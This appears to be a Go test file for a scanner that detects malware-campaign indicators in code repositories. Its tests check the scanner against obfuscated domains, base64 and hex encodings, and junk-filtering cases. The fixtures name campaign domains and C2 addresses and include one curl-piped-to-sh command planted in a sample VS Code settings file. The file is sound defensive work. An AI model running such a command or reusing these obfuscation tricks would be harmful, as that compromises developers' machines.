package indicator

import (
	"encoding/base64"
	"strings"
	"testing"
	"time"

	"skarvel/internal/criteria"
)

const c2 = "ipregionchecker.org"

func confirmedSet() *Set {
	return NewSet(Indicator{Value: c2, Kind: KindDomain, Source: "seed", Confirmed: true})
}

func TestMatchRaw(t *testing.T) {
	fs := confirmedSet().Match("a/b", "x.js", []byte("const u = 'https://www.ipregionchecker.org/api';"))
	if len(fs) != 1 {
		t.Fatalf("findings = %d, want 1", len(fs))
	}
	if fs[0].Tier != criteria.TierA {
		t.Errorf("tier = %v, want A for a confirmed indicator", fs[0].Tier)
	}
	if fs[0].Line != 1 {
		t.Errorf("line = %d, want 1", fs[0].Line)
	}
}

// The failure mode that once produced a wrong negative conclusion.
func TestMatchAcrossSplitConcatenation(t *testing.T) {
	src := `const u = "ipregion" + "checker" + ".org";`
	fs := confirmedSet().Match("a/b", "x.js", []byte(src))
	if len(fs) == 0 {
		t.Fatal("split concatenation must not hide an indicator")
	}
}

func TestMatchAcrossMultiLineConcatenation(t *testing.T) {
	src := "const u =\n  \"ipregion\" +\n  \"checker\" +\n  \".org\";\n"
	fs := confirmedSet().Match("a/b", "x.js", []byte(src))
	if len(fs) == 0 {
		t.Fatal("concatenation spanning lines must not hide an indicator")
	}
	if fs[0].Line != 2 {
		t.Errorf("line = %d, want the line the string starts on (2)", fs[0].Line)
	}
}

func TestMatchBase64Variants(t *testing.T) {
	std := base64.StdEncoding.EncodeToString([]byte(c2))
	if fs := confirmedSet().Match("a/b", "x.js", []byte("k='"+std+"'")); len(fs) == 0 {
		t.Error("standard base64 form not matched")
	}
	camp := campaignB64.EncodeToString([]byte(c2))
	if fs := confirmedSet().Match("a/b", "x.js", []byte("k='"+camp+"'")); len(fs) == 0 {
		t.Error("campaign-alphabet base64 form not matched")
	}
}

func TestMatchHexEscapes(t *testing.T) {
	var b strings.Builder
	for _, c := range []byte(c2) {
		b.WriteString("\\x")
		const hexd = "0123456789abcdef"
		b.WriteByte(hexd[c>>4])
		b.WriteByte(hexd[c&0xf])
	}
	if fs := confirmedSet().Match("a/b", "x.js", []byte("u='"+b.String()+"'")); len(fs) == 0 {
		t.Error("hex-escaped form not matched")
	}
}

func TestMatchCharCodeArray(t *testing.T) {
	var codes []string
	for _, c := range []byte(c2) {
		codes = append(codes, itoa(int(c)))
	}
	src := "var u = String.fromCharCode(" + strings.Join(codes, ",") + ");"
	if fs := confirmedSet().Match("a/b", "x.js", []byte(src)); len(fs) == 0 {
		t.Error("fromCharCode form not matched")
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	return string(b)
}

// An unconfirmed indicator is strong evidence, not definitive: it has not yet
// been tied to the campaign.
func TestUnconfirmedIndicatorIsTierB(t *testing.T) {
	s := NewSet(Indicator{Value: "weird-host.example.net", Kind: KindDomain})
	fs := s.Match("a/b", "x.js", []byte("u='weird-host.example.net'"))
	if len(fs) != 1 {
		t.Fatalf("findings = %d, want 1", len(fs))
	}
	if fs[0].Tier != criteria.TierB {
		t.Errorf("tier = %v, want B for an unconfirmed indicator", fs[0].Tier)
	}
}

func TestExtractFindsNetworkLocators(t *testing.T) {
	src := `
	  const a = "http://172.86.126.227:8087/api/notify";
	  const b = "evil-c2.example.io";
	  const local = "127.0.0.1:8080";
	  const gh = "https://github.com/foo/bar";
	`
	got := Extract("a/b", "x.js", []byte(src))
	var haveIP, haveDomain, haveLocal, haveGitHub bool
	for _, in := range got {
		switch {
		case strings.Contains(in.Value, "172.86.126.227"):
			haveIP = true
		case in.Value == "evil-c2.example.io":
			haveDomain = true
		case strings.Contains(in.Value, "127.0.0.1"):
			haveLocal = true
		case strings.Contains(in.Value, "github.com"):
			haveGitHub = true
		}
	}
	if !haveIP {
		t.Error("public C2 IP not extracted")
	}
	if !haveDomain {
		t.Error("candidate domain not extracted")
	}
	if haveLocal {
		t.Error("loopback address must not become an indicator")
	}
	if haveGitHub {
		t.Error("github.com must not become an indicator")
	}
}

func TestExtractDecodesBase64Payloads(t *testing.T) {
	enc := base64.StdEncoding.EncodeToString([]byte("https://hidden-c2.example.org/beacon"))
	got := Extract("a/b", "x.js", []byte("const K='"+enc+"';"))
	for _, in := range got {
		if strings.Contains(in.Value, "hidden-c2.example.org") {
			return
		}
	}
	t.Error("base64-wrapped endpoint not recovered")
}

func TestPromotionGate(t *testing.T) {
	cases := []struct {
		name      string
		ind       Indicator
		confirmed bool
		auto      bool
		queued    bool
	}{
		{"domain from confirmed file", Indicator{Value: "evil-c2.example.io", Kind: KindDomain}, true, true, false},
		{"url from confirmed file", Indicator{Value: "http://1.2.3.4:9/x", Kind: KindURL}, true, true, false},
		{"generic string is never auto", Indicator{Value: "processData", Kind: KindGeneric}, true, false, true},
		{"anything from an unconfirmed file is queued", Indicator{Value: "evil.example.io", Kind: KindDomain}, false, false, true},
		{"benign host is dropped entirely", Indicator{Value: "github.com", Kind: KindDomain}, true, false, false},
		{"short value is queued", Indicator{Value: "a.io", Kind: KindDomain}, true, false, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			auto, queued := Promote(c.ind, c.confirmed)
			if auto != c.auto || queued != c.queued {
				t.Errorf("auto=%v queued=%v, want auto=%v queued=%v", auto, queued, c.auto, c.queued)
			}
		})
	}
}

func TestEntropy(t *testing.T) {
	if Entropy("aaaaaaaa") > 0.1 {
		t.Error("uniform string should have near-zero entropy")
	}
	if Entropy("SuperStr0ngSecret@)@^") < 3.5 {
		t.Error("a mixed secret should register meaningful entropy")
	}
}

func TestSetDedupes(t *testing.T) {
	s := NewSet()
	s.Add(Indicator{Value: c2, Kind: KindDomain})
	s.Add(Indicator{Value: c2, Kind: KindDomain})
	if s.Len() != 1 {
		t.Errorf("len = %d, want 1", s.Len())
	}
}

// Regression: one crawl queued 482 candidates, nearly all JavaScript syntax.
func TestPropertyAccessesAreNotDomains(t *testing.T) {
	src := `
	  console.log(process.env.TOKEN);
	  module.exports = JSON.parse(x);
	  editor.fontSize = files.autoSave;
	  const p = "cmd.exe"; https.request(o); reqOut.end();
	  const real = "code-beautify.com";
	  const also = "codeprettier.pro";
	`
	got := Extract("a/b", "x.js", []byte(src))
	var vals []string
	for _, in := range got {
		if in.Kind == KindDomain {
			vals = append(vals, in.Value)
		}
	}
	for _, junk := range []string{"console.log", "process.env", "module.exports",
		"JSON.parse", "editor.fontSize", "files.autoSave", "cmd.exe",
		"https.request", "reqOut.end"} {
		for _, v := range vals {
			if strings.EqualFold(v, junk) {
				t.Errorf("%q is a property access, not a domain", junk)
			}
		}
	}
	var haveReal, havePro bool
	for _, v := range vals {
		switch strings.ToLower(v) {
		case "code-beautify.com":
			haveReal = true
		case "codeprettier.pro":
			havePro = true
		}
	}
	if !haveReal || !havePro {
		t.Errorf("real campaign domains lost: %v", vals)
	}
}

func TestPromoteRejectsNonTLD(t *testing.T) {
	auto, queued := Promote(Indicator{Value: "editor.fontSize", Kind: KindDomain}, true)
	if auto || queued {
		t.Error("a property access must not even reach the review queue")
	}
}

// The built-in set must be searched without being asked for.
func TestKnownIndicatorsAreConfirmed(t *testing.T) {
	if len(Known) == 0 {
		t.Fatal("the built-in indicator set is empty")
	}
	var haveBeautify bool
	for _, in := range Known {
		if !in.Confirmed {
			t.Errorf("%q must be Confirmed to score Tier A", in.Value)
		}
		if in.Source == "" {
			t.Errorf("%q must cite where it was confirmed", in.Value)
		}
		if in.Value == "code-beautify.com" {
			haveBeautify = true
		}
	}
	if !haveBeautify {
		t.Error("code-beautify.com missing from the built-in set")
	}
}

// A file of lines that each begin with `+` used to fold into a single logical
// line by repeatedly re-copying a growing string -- quadratic, so one crafted
// file could stall a whole run. It must stay fast and bounded, and an indicator
// elsewhere in the same file must still be found.
func TestPlusHeavyFileIsBoundedAndStillSearched(t *testing.T) {
	const n = 200000
	src := strings.Repeat("+x\n", n) + "u = 'https://www." + c2 + "/api';\n"

	start := time.Now()
	lines := logicalLines(src)
	fs := confirmedSet().Match("a/b", "notes.txt", []byte(src))
	if d := time.Since(start); d > 5*time.Second {
		t.Fatalf("took %s on a %d-line file; joining is not bounded", d, n)
	}

	if len(lines) < n/(maxJoinedParts+1) {
		t.Errorf("only %d logical lines for %d physical ones: the join cap is not applied", len(lines), n)
	}
	for _, ll := range lines {
		if len(ll.text) > maxJoinedBytes {
			t.Fatalf("a logical line is %d bytes, over the %d cap", len(ll.text), maxJoinedBytes)
		}
	}
	if len(fs) == 0 {
		t.Error("an indicator after a run of `+` lines was lost")
	}
}

// One very long line is not a continuation and must pass through whole: the
// campaign's stage-2 payload was a 3.9 MB single line.
func TestVeryLongSingleLineIsKeptWhole(t *testing.T) {
	long := strings.Repeat("a", 4<<20) + c2
	fs := confirmedSet().Match("a/b", "x.js", []byte(long))
	if len(fs) != 1 {
		t.Fatalf("findings = %d, want 1 for an indicator at the end of a 4 MB line", len(fs))
	}
}

func TestKnownIndicatorsMatchTierA(t *testing.T) {
	s := NewSet(Known...)
	fs := s.Match("a/b", ".vscode/settings.json",
		[]byte(`"command": "curl https://www.code-beautify.com/settings/linux?flag=3 | sh"`))
	if len(fs) == 0 {
		t.Fatal("built-in indicator did not match")
	}
	if fs[0].Tier != criteria.TierA {
		t.Errorf("tier = %v, want A for confirmed infrastructure", fs[0].Tier)
	}
}

// Mined candidates must be infrastructure, not file names, placeholders,
// versions or identifiers.
func TestExtractDropsJunk(t *testing.T) {
	src := `
	  run("install.sh"); require("this.is"); const t = "setup.pl";
	  const a = "https://www.google.com/x"; const b = "http://localhost:3000/api";
	  const c = "https://cdn.example.com/logo.png"; const d = "https://${HOST}/v1";
	  const v = "1.4.0.2"; const doc = "192.0.2.10"; const dns = "9.9.9.9";
	  const id = "processDataFromServerResponse";
	  const hex = "d41d8cd98f00b204e9800998ecf8427e";
	  const uuid = "123e4567-e89b-12d3-a456-426614174000";
	  const abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef0123456789";
	  const real = "https://update-cdn-check.xyz/payload.js";
	  const ip = "http://185.199.12.34:8080/a";
	  const key = "Zx9Kq2Lm8Pw4Vb7Nc1Rt5Yh3Jd6Fs0Ga";
	`
	got := Extract("a/b", "x.js", []byte(src))
	have := map[string]bool{}
	for _, in := range got {
		have[in.Value] = true
	}
	for _, junk := range []string{"install.sh", "this.is", "setup.pl",
		"https://www.google.com/x", "http://localhost:3000/api",
		"https://cdn.example.com/logo.png", "1.4.0.2", "192.0.2.10", "9.9.9.9",
		"processDataFromServerResponse", "d41d8cd98f00b204e9800998ecf8427e",
		"123e4567-e89b-12d3-a456-426614174000",
		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef0123456789", "www.google.com", "localhost"} {
		if have[junk] {
			t.Errorf("%q is junk and must not be extracted", junk)
		}
	}
	for v := range have {
		if strings.Contains(v, "${") {
			t.Errorf("template URL extracted: %q", v)
		}
	}
	for _, real := range []string{"https://update-cdn-check.xyz/payload.js", "update-cdn-check.xyz",
		"http://185.199.12.34:8080/a", "Zx9Kq2Lm8Pw4Vb7Nc1Rt5Yh3Jd6Fs0Ga"} {
		if !have[real] {
			t.Errorf("real indicator %q lost; got %v", real, have)
		}
	}
}

func TestCommonHostsIncludeSubdomains(t *testing.T) {
	for _, h := range []string{"google.com", "fonts.google.com", "a.b.amazonaws.com", "api.github.com"} {
		if !isCommonHost(h) {
			t.Errorf("%s should be a common host", h)
		}
	}
	for _, h := range []string{"evil.github.io", "x.vercel.app", "update-cdn-check.xyz"} {
		if isCommonHost(h) {
			t.Errorf("%s must stay a candidate (hosting that campaigns abuse)", h)
		}
	}
}
